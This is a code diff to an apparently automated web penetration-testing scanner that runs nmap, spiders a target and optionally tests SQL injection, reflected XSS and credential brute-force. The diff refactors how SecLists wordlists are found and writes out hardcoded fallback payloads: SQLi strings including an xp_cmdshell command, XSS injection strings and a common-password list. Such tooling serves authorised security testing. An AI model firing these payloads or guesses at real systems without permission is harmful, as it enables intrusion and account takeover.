@@ -22,7 +22,8 @@ import json
 import random
 import string
 import shlex
-from datetime import datetime
+from datetime import datetime, timezone
+from glob import glob
 from urllib.parse import urlparse, urljoin, parse_qs, urlencode
 
 # --- COLOR CONSTANTS ---
@@ -137,15 +138,18 @@ def load_wordlist(paths, fallback):
     Return fallback list if none found.
     """
     for path in paths:
-        if path and os.path.isfile(path):
+        if not path:
+            continue
+        candidate = os.path.expanduser(path)
+        if os.path.isfile(candidate):
             try:
-                with open(path, "r", encoding="utf-8", errors="ignore") as handle:
+                with open(candidate, "r", encoding="utf-8", errors="ignore") as handle:
                     entries = [line.strip() for line in handle if line.strip()]
                     if entries:
-                        log(f"Loaded {len(entries)} payloads from {path}", "SUCCESS")
+                        log(f"Loaded {len(entries)} payloads from {candidate}", "SUCCESS")
                         return entries
             except Exception as exc:
-                log(f"Failed to read wordlist {path}: {exc}", "WARN")
+                log(f"Failed to read wordlist {candidate}: {exc}", "WARN")
     log("Falling back to built-in payload list.", "WARN")
     return fallback[:]
 
@@ -174,10 +178,11 @@ def prompt_int(question, default):
             return int(raw)
         print("Please enter a positive integer.")
 
-def ensure_wordlist(paths, description, install_hint):
+def ensure_wordlist(paths, description, install_hint, search_hint=None):
     """
     Accept a string path or iterable of candidate paths.
-    Return the first existing path; otherwise exit with install guidance.
+    Return the first existing path; otherwise search within SecLists tree
+    and exit with install guidance if nothing is found.
     """
     if isinstance(paths, (list, tuple, set)):
         candidates = [os.path.expanduser(p) for p in paths if p]
@@ -188,10 +193,25 @@ def ensure_wordlist(paths, description, install_hint):
         if os.path.isfile(candidate):
             return candidate
 
+    basename = os.path.basename(candidates[0]) if candidates else ""
+    search_roots = [
+        "/usr/share/seclists",
+        os.path.expanduser("~/seclists"),
+    ]
+    if basename:
+        for root in search_roots:
+            search_pattern = os.path.join(root, "**", basename)
+            matches = glob(search_pattern, recursive=True)
+            for match in matches:
+                if os.path.isfile(match):
+                    log(f"Auto-detected {description} wordlist at {match}", "SUCCESS")
+                    return match
+
     expected = candidates[0] if candidates else "UNSPECIFIED"
     print(f"{Colors.FAIL}[!] Missing {description} wordlist: {expected}{Colors.ENDC}")
-
     print(f"    Install with: {install_hint}")
+    if search_hint:
+        print(f"    Hint: {search_hint}")
     print(f"    Expected to find file at: {expected}")
     sys.exit(1)
 
@@ -742,13 +762,19 @@ def main():
         log(f"Target {target} resolved to {target_ip}", "INFO")
         report.add_section(
             "Scan Context",
-            f"Target Host: {target}\nResolved IP: {target_ip}\nInterface: {args.interface}\nStarted: {datetime.utcnow().isoformat()}Z"
+            f"Target Host: {target}\nResolved IP: {target_ip}\nInterface: {args.interface}\nStarted: {datetime.now(timezone.utc).isoformat()}"
         )
     except:
         log("Could not resolve target. Exiting.", "ERROR")
         sys.exit(1)
 
     sniffer_info = None
+    brute_enabled = False
+    brute_limit = 0
+    xss_enabled = False
+    xss_limit = 0
+    sqli_enabled = False
+    sqli_limit = 0
 
     # 1. Run Nmap (Foreground - blocking)
     if not args.skip_nmap:
@@ -767,74 +793,88 @@ def main():
             nmap_report.extend(["", "[STDERR]", nmap_result["stderr"]])
         report.add_section("NMAP", "\n".join(nmap_report))
 
-    # 2. Run Spider (Foreground - blocking)
-    brute_enabled = False
-    brute_limit = 0
-    xss_enabled = False
-    xss_limit = 0
-    sqli_enabled = False
-    sqli_limit = 0
-
     if not args.skip_spider:
-        sqli_path = ensure_wordlist(
-            [args.sqli_wordlist, "/usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt", "/usr/share/seclists/Fuzzing/SQL Injection/Generic-SQLi.txt"],
-            "SQL Injection (SecLists Generic-SQLi)",
-            "sudo apt install seclists"
-        )
-        xss_path = ensure_wordlist(
-            [args.xss_wordlist, "/usr/share/seclists/Fuzzing/XSS/XSS-Common.txt"],
-            "XSS (SecLists XSS-Common)",
-            "sudo apt install seclists"
-        )
-        brute_path = ensure_wordlist(
-            [args.bruteforce_wordlist, "/usr/share/seclists/Passwords/Common-Credentials/common.txt"],
-            "Credential brute-force (SecLists common.txt)",
-            "sudo apt install seclists"
-        )
-
-        if prompt_yes_no("Run credential brute-force attempts using common.txt?"):
-            brute_enabled = True
-            brute_limit = prompt_int("Number of password guesses to try", 25)
-        if prompt_yes_no("Run reflected XSS testing using XSS-Common.txt?"):
-            xss_enabled = True
-            xss_limit = prompt_int("Number of XSS payloads to test", 25)
-        if prompt_yes_no("Run SQL injection testing using Generic-SQLi.txt?"):
-            sqli_enabled = True
+        print("\nConfigure application-layer tests (post-Nmap):")
+        sqli_enabled = prompt_yes_no("Enable SQL injection testing using Generic-SQLi.txt?")
+        if sqli_enabled:
             sqli_limit = prompt_int("Number of SQLi payloads to test", 25)
+        xss_enabled = prompt_yes_no("Enable reflected XSS testing using XSS-Common.txt?")
+        if xss_enabled:
+            xss_limit = prompt_int("Number of XSS payloads to test", 25)
+        brute_enabled = prompt_yes_no("Enable credential brute-force using common.txt?")
+        if brute_enabled:
+            brute_limit = prompt_int("Number of password guesses to try", 25)
+
+    # 2. Run Spider (Foreground - blocking)
+    if not args.skip_spider:
+        default_sqli_payloads = [
+            "'",
+            "'--",
+            '";',
+            "'; exec master..xp_cmdshell('whoami')--",
+            "'||'='",
+            "') WAITFOR DELAY '0:0:5'--",
+            "'+UNION+SELECT+NULL--"
+        ]
+        default_xss_payloads = [
+            '"><script>alert(1)</script>',
+            '"><img src=x onerror=alert(1)>',
+            '<script>alert(1)</script>',
+            '"><svg onload=alert(1)>',
+            '\'\"><iframe src=javascript:alert(1)>',
+            '"><body onload=alert(1)>',
+            '"><details open ontoggle=alert(1)>'
+        ]
+        default_brute_payloads = [
+            "admin", "password", "123456", "letmein", "qwerty",
+            "administrator", "root", "welcome", "passw0rd", "changeme"
+        ]
+
+        if sqli_enabled:
+            sqli_path = ensure_wordlist(
+                [
+                    args.sqli_wordlist,
+                    "/usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt",
+                    "/usr/share/seclists/Fuzzing/SQL Injection/Generic-SQLi.txt"
+                ],
+                "SQL Injection (SecLists Generic-SQLi)",
+                "sudo apt install seclists",
+                "Try: locate Generic-SQLi.txt"
+            )
+            sqli_payloads = load_wordlist([sqli_path], default_sqli_payloads)
+        else:
+            sqli_payloads = default_sqli_payloads[:]
+
+        if xss_enabled:
+            xss_path = ensure_wordlist(
+                [
+                    args.xss_wordlist,
+                    "/usr/share/seclists/Fuzzing/XSS/XSS-Common.txt"
+                ],
+                "XSS (SecLists XSS-Common)",
+                "sudo apt install seclists",
+                "Try: locate XSS-Common.txt"
+            )
+            xss_payloads = load_wordlist([xss_path], default_xss_payloads)
+        else:
+            xss_payloads = default_xss_payloads[:]
+
+        if brute_enabled:
+            brute_path = ensure_wordlist(
+                [
+                    args.bruteforce_wordlist,
+                    "/usr/share/seclists/Passwords/Common-Credentials/common.txt"
+                ],
+                "Credential brute-force (SecLists common.txt)",
+                "sudo apt install seclists",
+                "Try: locate common.txt"
+            )
+            brute_payloads = load_wordlist([brute_path], default_brute_payloads)
+        else:
+            brute_payloads = default_brute_payloads[:]
 
         url = f"http://{target}"
         log("Starting Web Spider/Scanner...", "INFO")
-        sqli_payloads = load_wordlist(
-            [sqli_path],
-            [
-                "'",
-                "'--",
-                '";',
-                "'; exec master..xp_cmdshell('whoami')--",
-                "'||'='",
-                "') WAITFOR DELAY '0:0:5'--",
-                "'+UNION+SELECT+NULL--"
-            ]
-        )
-        xss_payloads = load_wordlist(
-            [xss_path],
-            [
-                '"><script>alert(1)</script>',
-                '"><img src=x onerror=alert(1)>',
-                '<script>alert(1)</script>',
-                '"><svg onload=alert(1)>',
-                '\'\"><iframe src=javascript:alert(1)>',
-                '"><body onload=alert(1)>',
-                '"><details open ontoggle=alert(1)>'
-            ]
-        )
-        brute_payloads = load_wordlist(
-            [brute_path],
-            [
-                "admin", "password", "123456", "letmein", "qwerty",
-                "administrator", "root", "welcome", "passw0rd", "changeme"
-            ]
-        )
         spider = WebSpider(
             url,
             depth=3,
